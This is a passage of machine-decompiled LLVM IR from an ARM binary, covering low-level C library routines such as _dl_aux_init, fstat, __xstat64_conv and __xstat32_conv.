  %v4_179f0 = inttoptr i32 %v3_179f0 to i32*
  store i32 0, i32* %v4_179f0, align 4
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_179e0, %dec_label_pc_17994, %dec_label_pc_179d0, %dec_label_pc_179bc, %dec_label_pc_17948, %dec_label_pc_179b4, %bb
  %v0_17a00 = load i32, i32* @r5, align 4
  %v2_17a00 = add i32 %v0_17a00, 24
  %v3_17a00 = inttoptr i32 %v2_17a00 to i32*
  %v4_17a00 = load i32, i32* %v3_17a00, align 4
  store i32 %v4_17a00, i32* @ip, align 4
  call void @__pseudo_branch(i32 %v4_17a00)
  br label %dec_label_pc_17a0c

dec_label_pc_17a0c:                               ; preds = %dec_label_pc_17934, %.thread
  %v0_17a0c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v3_17900, i32* @r4, align 4
  store i32 %v6_17900, i32* @r5, align 4
  store i32 %v9_17900, i32* @r6, align 4
  store i32 %v12_17900, i32* @lr, align 4
  ret i32 %v0_17a0c

; uselistorder directives
  uselistorder i32 %v1_179a4, { 0, 5, 1, 4, 3, 2 }
  uselistorder i32 %v1_17988, { 0, 2, 1, 3, 4 }
  uselistorder i32* %r4.global-to-local, { 9, 0, 1, 2, 3, 4, 5, 6, 7, 8, 10, 11 }
  uselistorder i32 13, { 0, 3, 4, 6, 5, 1, 7, 2 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_17a0c, { 1, 0 }
  uselistorder label %.thread, { 6, 0, 2, 3, 5, 1, 4 }
}

define i32 @function_17a20(i32 %arg1) local_unnamed_addr {
dec_label_pc_17a20:
  %v0_17a20 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_17a20, label %bb, label %.thread3

bb:                                               ; preds = %dec_label_pc_17a20
  br label %.thread3

.thread3:                                         ; preds = %dec_label_pc_17a20, %bb
  %v10_17a30 = phi i32 [ %arg1, %dec_label_pc_17a20 ], [ 0, %bb ]
  ret i32 %v10_17a30

; uselistorder directives
  uselistorder label %.thread3, { 1, 0 }
}

define i32 @_dl_aux_init(i32 %arg1) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 ptrtoint (i32* @global_var_268d4.582 to i32), i32* %r2.global-to-local, align 4
  %v4_17a40 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_268d4.582 to i32), i32 104) to i32*), align 4
  %v4_17a48 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_268d4.582 to i32), i32 68) to i32*), align 4
  store i32 %v4_17a48, i32* %r1.global-to-local, align 4
  %v1_17a4c = add i32 %arg1, 44
  %v2_17a4c = inttoptr i32 %v1_17a4c to i32*
  %v3_17a4c = load i32, i32* %v2_17a4c, align 4
  %v1_17a50 = add i32 %arg1, 28
  %v2_17a50 = inttoptr i32 %v1_17a50 to i32*
  %v3_17a50 = load i32, i32* %v2_17a50, align 4
  store i32 %v3_17a50, i32* %r2.global-to-local, align 4
  %v2_17a54 = inttoptr i32 %v4_17a40 to i32*
  store i32 %v3_17a4c, i32* %v2_17a54, align 4
  %v0_17a58 = load i32, i32* %r2.global-to-local, align 4
  %v1_17a58 = load i32, i32* %r1.global-to-local, align 4
  %v2_17a58 = inttoptr i32 %v1_17a58 to i32*
  store i32 %v0_17a58, i32* %v2_17a58, align 4
  ret i32 %arg1

; uselistorder directives
  uselistorder i32 %arg1, { 0, 2, 1 }
}

define i32 @function_17a64(i32 %arg1) local_unnamed_addr {
dec_label_pc_17a64:
  %v0_17a64 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_17a64, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_17a64
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_17a64, %bb
  %v4_17a68 = phi i32 [ %arg1, %dec_label_pc_17a64 ], [ 0, %bb ]
  ret i32 %v4_17a68

; uselistorder directives
  uselistorder label %.thread, { 1, 0 }
}

define i32 @__GI_brk(i32 %arg1) local_unnamed_addr {
dec_label_pc_17aa8:
  store i32 %arg1, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_268d4.582 to i32), i32 29316) to i32*), align 4
  ret i32 0
}

define i32 @__aeabi_unwind_cpp_pr0() local_unnamed_addr {
entry:
  %v1_17ab8 = load i32, i32* @r0, align 4
  ret i32 %v1_17ab8
}

define i32 @__aeabi_unwind_cpp_pr1() local_unnamed_addr {
entry:
  %v1_17abc = load i32, i32* @r0, align 4
  ret i32 %v1_17abc
}

define i32 @__aeabi_unwind_cpp_pr2() local_unnamed_addr {
entry:
  %v1_17ac0 = load i32, i32* @r0, align 4
  ret i32 %v1_17ac0
}

define i32 @fstat() local_unnamed_addr {
entry:
  %r7.global-to-local = alloca i32, align 4
  %v0_17acc = load i32, i32* @r1, align 4
  store i32 %v0_17acc, i32* @r3, align 4
  %v0_17adc = load i32, i32* @r0, align 4
  store i32 %v0_17adc, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %v0_17adc, -4095
  br i1 %tmp, label %dec_label_pc_17afc, label %dec_label_pc_17ae8

dec_label_pc_17ae8:                               ; preds = %entry
  %v0_17ae8 = call i32 @__GI___errno_location()
  %v0_17aec = load i32, i32* %r7.global-to-local, align 4
  %v1_17aec = sub i32 0, %v0_17aec
  store i32 %v1_17aec, i32* @r3, align 4
  store i32 -1, i32* %r7.global-to-local, align 4
  %v2_17af4 = inttoptr i32 %v0_17ae8 to i32*
  store i32 %v1_17aec, i32* %v2_17af4, align 4
  br label %dec_label_pc_17b0c

dec_label_pc_17afc:                               ; preds = %entry
  %v2_17afc = icmp eq i32 %v0_17adc, 0
  br i1 %v2_17afc, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_17afc
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_17afc, %bb
  call void @__pseudo_cond_branch(i1 %v2_17afc, i32 ptrtoint (i32* @global_var_17c94.912 to i32))
  br label %dec_label_pc_17b0c

dec_label_pc_17b0c:                               ; preds = %dec_label_pc_17ae8, %.thread
  %v0_17b0c = load i32, i32* %r7.global-to-local, align 4
  ret i32 %v0_17b0c

; uselistorder directives
  uselistorder i32 %v0_17adc, { 1, 0, 2 }
  uselistorder i32* %r7.global-to-local, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_17b0c, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @__xstat64_conv(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %stack_var_-24 = alloca i32, align 4
  %v3_17b1c = load i32, i32* @r4, align 4
  store i32 %v3_17b1c, i32* %stack_var_-24, align 4
  store i32 %arg2, i32* %r5.global-to-local, align 4
  store i32 %tmp, i32* %r6.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 104, i32* @r2, align 4
  %v2_17b34 = inttoptr i32 %arg2 to i8*
  %v3_17b34 = call i32 @__GI_memset(i8* %v2_17b34, i32 0)
  %v2_17b38 = load i32, i32* %arg1, align 4
  store i32 %v2_17b38, i32* %r3.global-to-local, align 4
  %v3_17b38 = add i32 %tmp, 4
  %v4_17b38 = inttoptr i32 %v3_17b38 to i32*
  %v5_17b38 = load i32, i32* %v4_17b38, align 4
  store i32 %v5_17b38, i32* %r4.global-to-local, align 4
  %v0_17b3c = load i32, i32* %r5.global-to-local, align 4
  %v1_17b3c = inttoptr i32 %v0_17b3c to i32*
  store i32 %v2_17b38, i32* %v1_17b3c, align 4
  %v3_17b3c = add i32 %v0_17b3c, 4
  %v4_17b3c = inttoptr i32 %v3_17b3c to i32*
  %v5_17b3c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_17b3c, i32* %v4_17b3c, align 4
  %v0_17b40 = load i32, i32* %r6.global-to-local, align 4
  %v1_17b40 = add i32 %v0_17b40, 12
  %v2_17b40 = inttoptr i32 %v1_17b40 to i32*
  %v3_17b40 = load i32, i32* %v2_17b40, align 4
  %v1_17b44 = load i32, i32* %r5.global-to-local, align 4
  %v2_17b44 = add i32 %v1_17b44, 12
  %v3_17b44 = inttoptr i32 %v2_17b44 to i32*
  store i32 %v3_17b40, i32* %v3_17b44, align 4
  %v0_17b48 = load i32, i32* %r6.global-to-local, align 4
  %v1_17b48 = add i32 %v0_17b48, 96
  store i32 %v1_17b48, i32* %r3.global-to-local, align 4
  %v1_17b4c = inttoptr i32 %v1_17b48 to i32*
  %v2_17b4c = load i32, i32* %v1_17b4c, align 4
  store i32 %v2_17b4c, i32* %r3.global-to-local, align 4
  %v3_17b4c = add i32 %v0_17b48, 100
  %v4_17b4c = inttoptr i32 %v3_17b4c to i32*
  %v5_17b4c = load i32, i32* %v4_17b4c, align 4
  store i32 %v5_17b4c, i32* %r4.global-to-local, align 4
  %v1_17b50 = add i32 %v0_17b48, 56
  %v2_17b50 = inttoptr i32 %v1_17b50 to i32*
  %v3_17b50 = load i32, i32* %v2_17b50, align 4
  store i32 %v3_17b50, i32* %r2.global-to-local, align 4
  %v1_17b54 = load i32, i32* %r5.global-to-local, align 4
  %v2_17b54 = add i32 %v1_17b54, 96
  %v3_17b54 = inttoptr i32 %v2_17b54 to i32*
  store i32 %v2_17b4c, i32* %v3_17b54, align 4
  %v0_17b58 = load i32, i32* %r4.global-to-local, align 4
  %v1_17b58 = load i32, i32* %r5.global-to-local, align 4
  %v2_17b58 = add i32 %v1_17b58, 100
  %v3_17b58 = inttoptr i32 %v2_17b58 to i32*
  store i32 %v0_17b58, i32* %v3_17b58, align 4
  %v0_17b5c = load i32, i32* %r6.global-to-local, align 4
  %v1_17b5c = add i32 %v0_17b5c, 24
  store i32 %v1_17b5c, i32* %ip.global-to-local, align 4
  %v1_17b60 = inttoptr i32 %v1_17b5c to i32*
  %v2_17b60 = load i32, i32* %v1_17b60, align 4
  store i32 %v2_17b60, i32* %ip.global-to-local, align 4
  %v3_17b60 = add i32 %v0_17b5c, 28
  %v4_17b60 = inttoptr i32 %v3_17b60 to i32*
  %v5_17b60 = load i32, i32* %v4_17b60, align 4
  store i32 %v5_17b60, i32* %lr.global-to-local, align 4
  %v0_17b64 = load i32, i32* %r2.global-to-local, align 4
  %v1_17b64 = load i32, i32* %r5.global-to-local, align 4
  %v2_17b64 = add i32 %v1_17b64, 56
  %v3_17b64 = inttoptr i32 %v2_17b64 to i32*
  store i32 %v0_17b64, i32* %v3_17b64, align 4
  %v0_17b68 = load i32, i32* %r6.global-to-local, align 4
  %v1_17b68 = add i32 %v0_17b68, 72
  store i32 %v1_17b68, i32* %r3.global-to-local, align 4
  %v1_17b6c = add i32 %v0_17b68, 32
  store i32 %v1_17b6c, i32* %r7.global-to-local, align 4
  %v1_17b70 = inttoptr i32 %v1_17b6c to i32*
  %v2_17b70 = load i32, i32* %v1_17b70, align 4
  store i32 %v2_17b70, i32* %r7.global-to-local, align 4
  %v3_17b70 = add i32 %v0_17b68, 36
  %v4_17b70 = inttoptr i32 %v3_17b70 to i32*
  %v5_17b70 = load i32, i32* %v4_17b70, align 4
  store i32 %v5_17b70, i32* %r8.global-to-local, align 4
  %v1_17b74 = inttoptr i32 %v1_17b68 to i32*
  %v2_17b74 = load i32, i32* %v1_17b74, align 4
  %v3_17b74 = add i32 %v0_17b68, 76
  %v4_17b74 = inttoptr i32 %v3_17b74 to i32*
  %v5_17b74 = load i32, i32* %v4_17b74, align 4
  store i32 %v5_17b74, i32* %r1.global-to-local, align 4
  %v0_17b78 = load i32, i32* %r5.global-to-local, align 4
  %v1_17b78 = add i32 %v0_17b78, 72
  %v1_17b7c = inttoptr i32 %v1_17b78 to i32*
  store i32 %v2_17b74, i32* %v1_17b7c, align 4
  %v3_17b7c = add i32 %v0_17b78, 76
  %v4_17b7c = inttoptr i32 %v3_17b7c to i32*
  %v5_17b7c = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_17b7c, i32* %v4_17b7c, align 4
  %v0_17b80 = load i32, i32* %r7.global-to-local, align 4
  %v1_17b80 = load i32, i32* %r5.global-to-local, align 4
  %v2_17b80 = add i32 %v1_17b80, 32
  %v3_17b80 = inttoptr i32 %v2_17b80 to i32*
  store i32 %v0_17b80, i32* %v3_17b80, align 4
  %v0_17b84 = load i32, i32* %r8.global-to-local, align 4
  %v1_17b84 = load i32, i32* %r5.global-to-local, align 4
  %v2_17b84 = add i32 %v1_17b84, 36
  %v3_17b84 = inttoptr i32 %v2_17b84 to i32*
  store i32 %v0_17b84, i32* %v3_17b84, align 4
  %v0_17b88 = load i32, i32* %r6.global-to-local, align 4
  %v1_17b88 = add i32 %v0_17b88, 80
  store i32 %v1_17b88, i32* %r3.global-to-local, align 4
  %v1_17b8c = add i32 %v0_17b88, 48
  store i32 %v1_17b8c, i32* %r7.global-to-local, align 4
  %v1_17b90 = inttoptr i32 %v1_17b8c to i32*
  %v2_17b90 = load i32, i32* %v1_17b90, align 4
  store i32 %v2_17b90, i32* %r7.global-to-local, align 4
  %v3_17b90 = add i32 %v0_17b88, 52
  %v4_17b90 = inttoptr i32 %v3_17b90 to i32*
  %v5_17b90 = load i32, i32* %v4_17b90, align 4
  store i32 %v5_17b90, i32* %r8.global-to-local, align 4
  %v1_17b94 = inttoptr i32 %v1_17b88 to i32*
  %v2_17b94 = load i32, i32* %v1_17b94, align 4
  %v3_17b94 = add i32 %v0_17b88, 84
  %v4_17b94 = inttoptr i32 %v3_17b94 to i32*
  %v5_17b94 = load i32, i32* %v4_17b94, align 4
  store i32 %v5_17b94, i32* %r1.global-to-local, align 4
  %v1_17b98 = add i32 %v0_17b88, 16
  %v2_17b98 = inttoptr i32 %v1_17b98 to i32*
  %v3_17b98 = load i32, i32* %v2_17b98, align 4
  store i32 %v3_17b98, i32* %r2.global-to-local, align 4
  %v0_17b9c = load i32, i32* %r5.global-to-local, align 4
  %v1_17b9c = add i32 %v0_17b9c, 80
  %v1_17ba0 = inttoptr i32 %v1_17b9c to i32*
  store i32 %v2_17b94, i32* %v1_17ba0, align 4
  %v3_17ba0 = add i32 %v0_17b9c, 84
  %v4_17ba0 = inttoptr i32 %v3_17ba0 to i32*
  %v5_17ba0 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_17ba0, i32* %v4_17ba0, align 4
  %v0_17ba4 = load i32, i32* %r7.global-to-local, align 4
  %v1_17ba4 = load i32, i32* %r5.global-to-local, align 4
  %v2_17ba4 = add i32 %v1_17ba4, 48
  %v3_17ba4 = inttoptr i32 %v2_17ba4 to i32*
  store i32 %v0_17ba4, i32* %v3_17ba4, align 4
  %v0_17ba8 = load i32, i32* %r8.global-to-local, align 4
  %v1_17ba8 = load i32, i32* %r5.global-to-local, align 4
  %v2_17ba8 = add i32 %v1_17ba8, 52
  %v3_17ba8 = inttoptr i32 %v2_17ba8 to i32*
  store i32 %v0_17ba8, i32* %v3_17ba8, align 4
  %v0_17bac = load i32, i32* %r2.global-to-local, align 4
  %v1_17bac = load i32, i32* %r5.global-to-local, align 4
  %v2_17bac = add i32 %v1_17bac, 16
  %v3_17bac = inttoptr i32 %v2_17bac to i32*
  store i32 %v0_17bac, i32* %v3_17bac, align 4
  %v0_17bb0 = load i32, i32* %r6.global-to-local, align 4
  %v1_17bb0 = add i32 %v0_17bb0, 88
  store i32 %v1_17bb0, i32* %r3.global-to-local, align 4
  %v1_17bb4 = add i32 %v0_17bb0, 20
  %v2_17bb4 = inttoptr i32 %v1_17bb4 to i32*
  %v3_17bb4 = load i32, i32* %v2_17bb4, align 4
  store i32 %v3_17bb4, i32* %r2.global-to-local, align 4
  %v1_17bb8 = inttoptr i32 %v1_17bb0 to i32*
  %v2_17bb8 = load i32, i32* %v1_17bb8, align 4
  %v3_17bb8 = add i32 %v0_17bb0, 92
  %v4_17bb8 = inttoptr i32 %v3_17bb8 to i32*
  %v5_17bb8 = load i32, i32* %v4_17bb8, align 4
  store i32 %v5_17bb8, i32* %r1.global-to-local, align 4
  %v1_17bbc = add i32 %v0_17bb0, 64
  store i32 %v1_17bbc, i32* %r6.global-to-local, align 4
  %v1_17bc0 = inttoptr i32 %v1_17bbc to i32*
  %v2_17bc0 = load i32, i32* %v1_17bc0, align 4
  store i32 %v2_17bc0, i32* %r6.global-to-local, align 4
  %v3_17bc0 = add i32 %v0_17bb0, 68
  %v4_17bc0 = inttoptr i32 %v3_17bc0 to i32*
  %v5_17bc0 = load i32, i32* %v4_17bc0, align 4
  store i32 %v5_17bc0, i32* %r7.global-to-local, align 4
  %v0_17bc4 = load i32, i32* %r5.global-to-local, align 4
  %v1_17bc4 = add i32 %v0_17bc4, 88
  store i32 %v1_17bc4, i32* %r3.global-to-local, align 4
  %v2_17bc8 = add i32 %v0_17bc4, 20
  %v3_17bc8 = inttoptr i32 %v2_17bc8 to i32*
  store i32 %v3_17bb4, i32* %v3_17bc8, align 4
  %v0_17bcc = load i32, i32* %ip.global-to-local, align 4
  %v1_17bcc = load i32, i32* %r5.global-to-local, align 4
  %v2_17bcc = add i32 %v1_17bcc, 24
  %v3_17bcc = inttoptr i32 %v2_17bcc to i32*
  store i32 %v0_17bcc, i32* %v3_17bcc, align 4
  %v0_17bd0 = load i32, i32* %lr.global-to-local, align 4
  %v1_17bd0 = load i32, i32* %r5.global-to-local, align 4
  %v2_17bd0 = add i32 %v1_17bd0, 28
  %v3_17bd0 = inttoptr i32 %v2_17bd0 to i32*
  store i32 %v0_17bd0, i32* %v3_17bd0, align 4
  %v0_17bd4 = load i32, i32* %r6.global-to-local, align 4
  %v1_17bd4 = load i32, i32* %r5.global-to-local, align 4
  %v2_17bd4 = add i32 %v1_17bd4, 64
  %v3_17bd4 = inttoptr i32 %v2_17bd4 to i32*
  store i32 %v0_17bd4, i32* %v3_17bd4, align 4
  %v0_17bd8 = load i32, i32* %r7.global-to-local, align 4
  %v1_17bd8 = load i32, i32* %r5.global-to-local, align 4
  %v2_17bd8 = add i32 %v1_17bd8, 68
  %v3_17bd8 = inttoptr i32 %v2_17bd8 to i32*
  store i32 %v0_17bd8, i32* %v3_17bd8, align 4
  %v0_17bdc = load i32, i32* %r3.global-to-local, align 4
  %v1_17bdc = inttoptr i32 %v0_17bdc to i32*
  store i32 %v2_17bb8, i32* %v1_17bdc, align 4
  %v3_17bdc = add i32 %v0_17bdc, 4
  %v4_17bdc = inttoptr i32 %v3_17bdc to i32*
  %v5_17bdc = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_17bdc, i32* %v4_17bdc, align 4
  %v2_17be0 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_17be0, i32* %r4.global-to-local, align 4
  ret i32 %v2_17bb8

; uselistorder directives
  uselistorder i32 %v0_17bb0, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v0_17b88, { 1, 0, 2, 3, 4 }
  uselistorder i32* %r6.global-to-local, { 0, 1, 2, 3, 8, 4, 5, 6, 7, 9 }
  uselistorder i32* %r5.global-to-local, { 8, 0, 1, 2, 3, 4, 5, 6, 7, 9, 10, 11, 12, 13, 14, 15, 16, 17 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 0 }
  uselistorder i32 100, { 9, 0, 1, 2, 3, 4, 5, 6, 7, 8 }
  uselistorder i32 104, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0, 2 }
}

define i32 @__xstat32_conv(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %stack_var_-16 = alloca i32, align 4
  %v3_17be8 = load i32, i32* @r4, align 4
  store i32 %v3_17be8, i32* %stack_var_-16, align 4
  store i32 %arg2, i32* %r6.global-to-local, align 4
  store i32 %tmp, i32* %r5.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 88, i32* @r2, align 4
  %v2_17c00 = inttoptr i32 %arg2 to i8*
  %v3_17c00 = call i32 @__GI_memset(i8* %v2_17c00, i32 0)
  %v2_17c04 = load i32, i32* %arg1, align 4
  %v3_17c04 = add i32 %tmp, 4
  %v4_17c04 = inttoptr i32 %v3_17c04 to i32*
  %v5_17c04 = load i32, i32* %v4_17c04, align 4
  store i32 %v5_17c04, i32* %r4.global-to-local, align 4
  %v0_17c08 = load i32, i32* %r6.global-to-local, align 4
  %v1_17c08 = inttoptr i32 %v0_17c08 to i32*
  store i32 %v2_17c04, i32* %v1_17c08, align 4
  %v3_17c08 = add i32 %v0_17c08, 4
  %v4_17c08 = inttoptr i32 %v3_17c08 to i32*
  %v5_17c08 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_17c08, i32* %v4_17c08, align 4
  %v0_17c0c = load i32, i32* %r5.global-to-local, align 4
  %v1_17c0c = add i32 %v0_17c0c, 32
  %v1_17c10 = inttoptr i32 %v1_17c0c to i32*
  %v2_17c10 = load i32, i32* %v1_17c10, align 4
  %v3_17c10 = add i32 %v0_17c0c, 36
  %v4_17c10 = inttoptr i32 %v3_17c10 to i32*
  %v5_17c10 = load i32, i32* %v4_17c10, align 4
  store i32 %v5_17c10, i32* %r4.global-to-local, align 4
  %v1_17c14 = add i32 %v0_17c0c, 96
  %v2_17c14 = inttoptr i32 %v1_17c14 to i32*
  %v3_17c14 = load i32, i32* %v2_17c14, align 4
  store i32 %v3_17c14, i32* %r2.global-to-local, align 4
  %v1_17c18 = load i32, i32* %r6.global-to-local, align 4
  %v2_17c18 = add i32 %v1_17c18, 32
  %v3_17c18 = inttoptr i32 %v2_17c18 to i32*
  store i32 %v2_17c10, i32* %v3_17c18, align 4
  %v0_17c1c = load i32, i32* %r4.global-to-local, align 4
  %v1_17c1c = load i32, i32* %r6.global-to-local, align 4
  %v2_17c1c = add i32 %v1_17c1c, 36
  %v3_17c1c = inttoptr i32 %v2_17c1c to i32*
  store i32 %v0_17c1c, i32* %v3_17c1c, align 4
  %v0_17c20 = load i32, i32* %r2.global-to-local, align 4
  %v1_17c20 = load i32, i32* %r6.global-to-local, align 4
  %v2_17c20 = add i32 %v1_17c20, 12
  %v3_17c20 = inttoptr i32 %v2_17c20 to i32*
  store i32 %v0_17c20, i32* %v3_17c20, align 4
  %v0_17c24 = load i32, i32* %r5.global-to-local, align 4
  %v1_17c24 = add i32 %v0_17c24, 48
  %v2_17c24 = inttoptr i32 %v1_17c24 to i32*
  %v3_17c24 = load i32, i32* %v2_17c24, align 4
  %v1_17c28 = add i32 %v0_17c24, 24
  store i32 %v1_17c28, i32* %ip.global-to-local, align 4
  %v1_17c2c = inttoptr i32 %v1_17c28 to i32*
  %v2_17c2c = load i32, i32* %v1_17c2c, align 4
  store i32 %v2_17c2c, i32* %ip.global-to-local, align 4
  %v3_17c2c = add i32 %v0_17c24, 28
  %v4_17c2c = inttoptr i32 %v3_17c2c to i32*
  %v5_17c2c = load i32, i32* %v4_17c2c, align 4
  store i32 %v5_17c2c, i32* %lr.global-to-local, align 4
  %v1_17c30 = load i32, i32* %r6.global-to-local, align 4
  %v2_17c30 = add i32 %v1_17c30, 44
  %v3_17c30 = inttoptr i32 %v2_17c30 to i32*
  store i32 %v3_17c24, i32* %v3_17c30, align 4
  %v0_17c34 = load i32, i32* %r5.global-to-local, align 4
  %v1_17c34 = add i32 %v0_17c34, 64
  %v2_17c34 = inttoptr i32 %v1_17c34 to i32*
  %v3_17c34 = load i32, i32* %v2_17c34, align 4
  %v1_17c38 = add i32 %v0_17c34, 56
  %v2_17c38 = inttoptr i32 %v1_17c38 to i32*
  %v3_17c38 = load i32, i32* %v2_17c38, align 4
  store i32 %v3_17c38, i32* %r2.global-to-local, align 4
  %v1_17c3c = load i32, i32* %r6.global-to-local, align 4
  %v2_17c3c = add i32 %v1_17c3c, 52
  %v3_17c3c = inttoptr i32 %v2_17c3c to i32*
  store i32 %v3_17c34, i32* %v3_17c3c, align 4
  %v0_17c40 = load i32, i32* %r2.global-to-local, align 4
  %v1_17c40 = load i32, i32* %r6.global-to-local, align 4
  %v2_17c40 = add i32 %v1_17c40, 48
  %v3_17c40 = inttoptr i32 %v2_17c40 to i32*
  store i32 %v0_17c40, i32* %v3_17c40, align 4
  %v0_17c44 = load i32, i32* %r5.global-to-local, align 4
  %v1_17c44 = add i32 %v0_17c44, 72
  %v1_17c48 = inttoptr i32 %v1_17c44 to i32*
  %v2_17c48 = load i32, i32* %v1_17c48, align 4
  %v3_17c48 = add i32 %v0_17c44, 76
  %v4_17c48 = inttoptr i32 %v3_17c48 to i32*
  %v5_17c48 = load i32, i32* %v4_17c48, align 4
  store i32 %v5_17c48, i32* %r1.global-to-local, align 4
  %v0_17c4c = load i32, i32* %r6.global-to-local, align 4
  %v1_17c4c = add i32 %v0_17c4c, 56
  %v1_17c50 = inttoptr i32 %v1_17c4c to i32*
  store i32 %v2_17c48, i32* %v1_17c50, align 4
  %v3_17c50 = add i32 %v0_17c4c, 60
  %v4_17c50 = inttoptr i32 %v3_17c50 to i32*
  %v5_17c50 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_17c50, i32* %v4_17c50, align 4
  %v0_17c54 = load i32, i32* %r5.global-to-local, align 4
  %v1_17c54 = add i32 %v0_17c54, 80
  %v1_17c58 = inttoptr i32 %v1_17c54 to i32*
  %v2_17c58 = load i32, i32* %v1_17c58, align 4
  %v3_17c58 = add i32 %v0_17c54, 84
  %v4_17c58 = inttoptr i32 %v3_17c58 to i32*
  %v5_17c58 = load i32, i32* %v4_17c58, align 4
  store i32 %v5_17c58, i32* %r1.global-to-local, align 4
  %v0_17c5c = load i32, i32* %r6.global-to-local, align 4
  %v1_17c5c = add i32 %v0_17c5c, 64
  %v1_17c60 = inttoptr i32 %v1_17c5c to i32*
  store i32 %v2_17c58, i32* %v1_17c60, align 4
  %v3_17c60 = add i32 %v0_17c5c, 68
  %v4_17c60 = inttoptr i32 %v3_17c60 to i32*
  %v5_17c60 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_17c60, i32* %v4_17c60, align 4
  %v0_17c64 = load i32, i32* %r5.global-to-local, align 4
  %v1_17c64 = add i32 %v0_17c64, 16
  %v2_17c64 = inttoptr i32 %v1_17c64 to i32*
  %v3_17c64 = load i32, i32* %v2_17c64, align 4
  %v1_17c68 = load i32, i32* %r6.global-to-local, align 4
  %v2_17c68 = add i32 %v1_17c68, 16
  %v3_17c68 = inttoptr i32 %v2_17c68 to i32*
  store i32 %v3_17c64, i32* %v3_17c68, align 4
  %v0_17c6c = load i32, i32* %r5.global-to-local, align 4
  %v1_17c6c = add i32 %v0_17c6c, 88
  %v1_17c70 = add i32 %v0_17c6c, 20
  %v2_17c70 = inttoptr i32 %v1_17c70 to i32*
  %v3_17c70 = load i32, i32* %v2_17c70, align 4
  store i32 %v3_17c70, i32* %r2.global-to-local, align 4
  %v1_17c74 = inttoptr i32 %v1_17c6c to i32*
  %v2_17c74 = load i32, i32* %v1_17c74, align 4
  %v3_17c74 = add i32 %v0_17c6c, 92
  %v4_17c74 = inttoptr i32 %v3_17c74 to i32*
  %v5_17c74 = load i32, i32* %v4_17c74, align 4
  store i32 %v5_17c74, i32* %r1.global-to-local, align 4
  %v0_17c78 = load i32, i32* %r6.global-to-local, align 4
  %v1_17c78 = add i32 %v0_17c78, 72
  %v1_17c7c = inttoptr i32 %v1_17c78 to i32*
  store i32 %v2_17c74, i32* %v1_17c7c, align 4
  %v3_17c7c = add i32 %v0_17c78, 76
  %v4_17c7c = inttoptr i32 %v3_17c7c to i32*
  %v5_17c7c = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_17c7c, i32* %v4_17c7c, align 4
  %v0_17c80 = load i32, i32* %r2.global-to-local, align 4
  %v1_17c80 = load i32, i32* %r6.global-to-local, align 4
  %v2_17c80 = add i32 %v1_17c80, 20
  %v3_17c80 = inttoptr i32 %v2_17c80 to i32*
  store i32 %v0_17c80, i32* %v3_17c80, align 4
  %v0_17c84 = load i32, i32* %ip.global-to-local, align 4
  %v1_17c84 = load i32, i32* %r6.global-to-local, align 4
  %v2_17c84 = add i32 %v1_17c84, 24
  %v3_17c84 = inttoptr i32 %v2_17c84 to i32*
  store i32 %v0_17c84, i32* %v3_17c84, align 4
  %v0_17c88 = load i32, i32* %lr.global-to-local, align 4
  %v1_17c88 = load i32, i32* %r6.global-to-local, align 4
  %v2_17c88 = add i32 %v1_17c88, 28
  %v3_17c88 = inttoptr i32 %v2_17c88 to i32*
  store i32 %v0_17c88, i32* %v3_17c88, align 4
  %v2_17c8c = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_17c8c, i32* %r4.global-to-local, align 4
  ret i32 %v2_17c74

; uselistorder directives
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 0 }
  uselistorder i32 92, { 0, 1, 3, 2 }
  uselistorder i32 84, { 1, 2, 0, 3, 4, 5 }
  uselistorder i32 80, { 1, 2, 3, 4, 5, 6, 0, 7 }
  uselistorder i32 96, { 4, 5, 6, 7, 8, 1, 2, 0, 3 }
